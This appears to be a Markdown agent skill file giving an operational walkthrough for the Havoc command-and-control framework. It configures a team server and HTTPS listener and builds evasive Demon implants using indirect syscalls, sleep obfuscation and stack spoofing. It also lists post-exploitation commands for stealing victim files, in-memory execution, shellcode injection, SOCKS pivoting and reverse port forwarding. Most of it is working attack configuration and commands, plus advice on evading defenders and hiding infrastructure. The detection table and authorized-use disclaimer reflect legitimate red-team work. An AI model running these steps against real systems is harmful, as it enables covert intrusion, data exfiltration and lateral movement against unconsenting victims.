---
name: operating-havoc-c2
description: Deploy a Havoc C2 team server with Yaotl malleable profiles, generate evasive Demon agents using indirect syscalls and sleep obfuscation, and run post-exploitation and pivoting operations.
subdomain: red-teaming
facing: config
mitre_attack:
- T1071.001
nist_csf:
- DE.CM-01
upstream: operating-havoc-c2@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized security testing, sanctioned red-team engagements, and education only. Deploying a C2 framework or its agents against systems you do not own or lack explicit written authorization to test is illegal. Operate strictly within a signed rules-of-engagement document.

## Prerequisites

- Dedicated Linux host (Debian/Ubuntu/Kali) for team server
- Go 1.18+ for team server; Python 3.10 and Qt5 libraries for client
- mingw-w64 and nasm for cross-compiling Demon for Windows targets
- Signed authorization / rules of engagement

Install dependencies and build from source:

```bash
# Clone the framework
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc

# Debian/Ubuntu/Kali build dependencies
sudo apt update && sudo apt install -y \
  git build-essential cmake libfontconfig1 libglu1-mesa-dev libgtest-dev \
  libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev \
  libreadline-dev libffi-dev libsqlite3-dev libbz2-dev qtbase5-dev qtchooser \
  qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev \
  qtdeclarative5-dev golang-go python3.10 python3.10-dev mingw-w64 nasm

# Build the team server
make ts-build

# Build the client
make client-build
```

## MITRE ATT&CK Mapping

| ID | Technique | Use in this skill |
|----|-----------|-------------------|
| T1071.001 | Application Layer Protocol: Web Protocols | Demon's HTTP(S) listener carries C2 over web protocols to blend with normal traffic |

Related techniques exercised by workflow:

| ID | Technique |
|----|-----------|
| T1027.007 | Obfuscated Files or Information: Dynamic API Resolution (indirect syscalls) |
| T1620 | Reflective Code Loading (in-memory .NET / BOF) |
| T1055 | Process Injection |
| T1090.001 | Internal Proxy (SOCKS pivot) |

## Workflow

### Step 1: Write Yaotl profile

Create `profiles/engagement.yaotl` defining team server, operator, and HTTP listener. Yaotl is HCL-style:

```hcl
Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "operator1" {
        Password = "ChangeMe_Str0ng!"
    }
}

Listeners {
    Http {
        Name     = "https-listener"
        Hosts    = ["c2.example.com"]
        HostBind = "0.0.0.0"
        PortBind = 443
        PortConn = 443
        Secure   = true   # HTTPS
    }
}

Demon {
    Sleep = 30
    Jitter = 25

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}
```

### Step 2: Launch team server

Run team server with your profile (privileged ports may require sudo):

```bash
# Verbose run with a custom profile
./havoc server --profile profiles/engagement.yaotl -v

# Add debug logging
./havoc server --profile profiles/engagement.yaotl --verbose --debug
```

### Step 3: Connect with client

Launch Qt client and connect to team server using operator credentials from profile:

```bash
./havoc client
```

In connect dialog: enter team server host, port `40056`, operator name `operator1`, and profile password. Demon panel and listener views appear once connected.

### Step 4: Create / verify listener

HTTP listener defined in profile loads automatically. To add another at runtime use **Listeners → Add** in GUI and configure: Name, Hosts (callback domains/IPs), HostBind, PortBind, PortConn, and whether it is Secure (HTTPS).

### Step 5: Generate Demon agent

In GUI go to **Attack → Payload** and configure Demon build:

- **Listener:** `https-listener`
- **Architecture:** `x64`
- **Format:** `Windows Exe`, `Windows Dll`, or `Windows Shellcode`
- **Sleep:** e.g., `30` seconds with jitter
- **Indirect Syscalls:** Enabled (Hell's Gate / Halo's Gate)
- **Sleep Technique:** `Ekko` (encrypts agent memory during sleep)
- **Stack Spoofing / Proxy Loading:** Enabled
- **Sleep Jmp Gadget:** as available

Click **Generate** to produce payload. Deliver it to target through your authorized initial-access method.

### Step 6: Interact with Demon

When Demon checks in it appears in session table. Right-click → **Interact** (or double-click) to open console. Core post-exploitation commands:

```
# Situational awareness
whoami
pwd
ls
ps
ipconfig
net localgroup administrators

# Token / privilege
getprivs
token list

# File operations
download C:\Users\victim\Documents\secrets.docx
upload /opt/tools/tool.exe C:\Windows\Temp\tool.exe
```

### Step 7: In-memory execution (.NET and BOFs)

Demon supports in-memory execution of .NET assemblies and Beacon Object Files, avoiding disk writes:

```
# Execute a .NET assembly in-memory (e.g., Seatbelt, Rubeus)
dotnet inline-execute /opt/tools/Seatbelt.exe -group=system

# Run a Beacon Object File
inline-execute /opt/bofs/whoami.o
```

### Step 8: Process injection and migration

```
# Inject shellcode into a spawned/target process
shellcode inject x64 PID /tmp/payload.bin

# Run an assembly under a sacrificial process per profile Injection settings
proc create C:\Windows\System32\notepad.exe
```

### Step 9: Pivot into segmented networks

```
# Start a SOCKS5 proxy through the Demon for proxychains tooling
socks add 1080

# Port forward (reverse) to reach an internal service
rportfwd add 8443 10.0.5.20 443
```

### Step 10: Clean up

```
# Remove uploaded artifacts and exit the agent cleanly
rm C:\Windows\Temp\tool.exe
exit
```

Stop team server (`Ctrl-C`) and revoke operator credentials at engagement end.

## Tools and Resources

| Resource | Purpose | Link |
|----------|---------|------|
| Havoc Framework | Source and releases | https://github.com/HavocFramework/Havoc |
| Havoc Documentation | Official docs (teamserver, profiles, agent) | https://havocframework.com/docs |
| Havoc Profiles | Sample Yaotl profiles | https://github.com/HavocFramework/Havoc/tree/main/profiles |
| MITRE ATT&CK T1071.001 | Web Protocols | https://attack.mitre.org/techniques/T1071/001/ |

## OPSEC and Detection Considerations

| Demon feature | Purpose | Defender detection opportunity |
|---------------|---------|--------------------------------|
| Indirect syscalls (Hell's/Halo's Gate) | Bypass user-mode API hooks | Kernel ETW (Threat-Intelligence provider), call-stack anomalies |
| Sleep obfuscation (Ekko) | Encrypt agent in memory while sleeping | Memory scanning between sleeps, timer-queue/ROP artifacts |
| Stack spoofing | Hide implant in call stacks | Unbacked-memory thread start, spoofed-frame heuristics |
| HTTP(S) C2 | Blend with web traffic | Beaconing periodicity, JA3/TLS fingerprint, malleable headers |

- Tune `Sleep` and `Jitter` high to reduce beacon regularity.
- Front HTTP(S) listeners with nginx/Apache redirectors; never expose team server IP.
- Prefer in-memory `dotnet inline-execute` / BOFs over spawning child processes.

## Validation Criteria

- [ ] Havoc team server and client built from source successfully
- [ ] Yaotl profile authored with team server, operator, and HTTP(S) listener
- [ ] Team server launched with profile and operator connected via client
- [ ] HTTP(S) listener active
- [ ] Evasive Demon agent generated with sleep obfuscation and indirect syscalls
- [ ] Demon checks in and post-exploitation commands run
- [ ] A .NET assembly or BOF executed in-memory
- [ ] SOCKS proxy or port-forward established for pivoting
- [ ] Artifacts removed, agent exited, and team server stopped at cleanup

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/operating-havoc-c2
